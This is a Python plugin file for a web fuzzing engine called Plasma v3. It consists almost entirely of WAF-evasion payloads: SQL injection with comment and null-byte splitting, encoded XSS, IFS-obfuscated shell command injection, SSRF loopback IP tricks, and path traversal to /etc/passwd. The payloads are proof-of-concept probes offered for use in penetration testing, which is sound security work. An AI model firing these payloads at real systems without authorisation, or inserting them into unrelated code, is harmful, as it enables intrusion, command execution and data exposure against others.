"""
plugins/sample_evasion_plugin.py — Plasma v3
──────────────────────────────────────────────
Sample FuzzEngine plugin demonstrating advanced evasion effectiveness.

This plugin contributes payloads that bypass common WAF signatures by
combining encoding, comment injection, null-byte insertion, and case swapping.

It also shows how to use the fuzz_plugin_api helpers.

Load automatically with --fuzz --plugin-dir plugins/
(or manually: engine.load_plugins_from_dir("plugins/"))

Evasion effectiveness demonstrated
───────────────────────────────────
  sqli:comment-null  — SQL comment + null-byte; evades most regex WAFs
  xss:mixed-encode   — Mixed encoding; evades single-codec scanners
  rce:ifs-split      — IFS + command splitting; evades space filters
  ssrf:decimal-dns   — Decimal IP + DNS alias combo; evades IP blocklists
"""

from __future__ import annotations

import base64
import urllib.parse


def fuzz_plugin(endpoint, context, matrix):
    """
    Entry point for the FuzzEngine plugin loader.

    Returns: list[tuple[str, str]] — (payload, technique_label)
    """
    results: list[tuple[str, str]] = []

    # ── 1. SQLi: comment-split + null-byte hybrid ─────────────────────────────
    sql_payloads = [
        ("' UN/**/ION%00SE/**/LECT NULL--",      "sqli:comment-null-union"),
        ("' OR/**/1/**/=/**/1--",                "sqli:comment-spaces"),
        ("'/**/OR/**/'1'='1",                    "sqli:comment-quote-bypass"),
        ("' OR 0x31=0x31--",                     "sqli:hex-comparison"),
        ("' OR CHAR(49)=CHAR(49)--",             "sqli:char-comparison"),
    ]
    results.extend(sql_payloads)

    # ── 2. XSS: mixed encoding polyglot ──────────────────────────────────────
    xss_raw    = "<script>alert(1)</script>"
    xss_b64    = base64.b64encode(xss_raw.encode()).decode()
    xss_url    = urllib.parse.quote(xss_raw, safe="")
    double_url = urllib.parse.quote(xss_url, safe="")

    results.extend([
        (xss_url,                                "xss:url-encoded"),
        (double_url,                             "xss:double-url-encoded"),
        (f"data:text/html;base64,{xss_b64}",    "xss:data-uri-base64"),
        ("<IMG SRC=x OnErRoR=alert(1)>",         "xss:mixed-case-event"),
        ("<svg/onload\t=alert(1)>",              "xss:tab-in-event"),
        ("<details/open/ontoggle=alert(1)>",     "xss:html5-event"),
    ])

    # ── 3. RCE: shell obfuscation chain ──────────────────────────────────────
    results.extend([
        ("${IFS}id",                             "rce:ifs-bypass"),
        ("i''d",                                 "rce:single-quote-split"),
        ("$(echo id|sh)",                        "rce:subshell-echo"),
        ("`$(id)`",                              "rce:nested-backtick"),
        ("%0aid",                                "rce:newline-injection"),
        ("a;i${IFS}d;b",                         "rce:ifs-mid-command"),
    ])

    # ── 4. SSRF: IP obfuscation ladder ───────────────────────────────────────
    results.extend([
        ("http://2130706433/",                   "ssrf:decimal-ip"),
        ("http://0177.0.0.1/",                   "ssrf:octal-ip"),
        ("http://0x7f000001/",                   "ssrf:hex-ip"),
        ("http://127.1/",                        "ssrf:short-ip"),
        ("http://[::1]/",                        "ssrf:ipv6-loopback"),
        ("http://localtest.me/",                 "ssrf:dns-alias"),
        ("http://①②⑦.⓪.⓪.①/",               "ssrf:unicode-ip"),
    ])

    # ── 5. Path Traversal: encoding variants ─────────────────────────────────
    results.extend([
        ("..%252F..%252Fetc%252Fpasswd",         "traversal:double-encoded"),
        ("....//....//etc/passwd",               "traversal:double-dot-bypass"),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd",       "traversal:hex-dots-slashes"),
        ("\\..\\..\\..",                         "traversal:backslash-mix"),
    ])

    return results
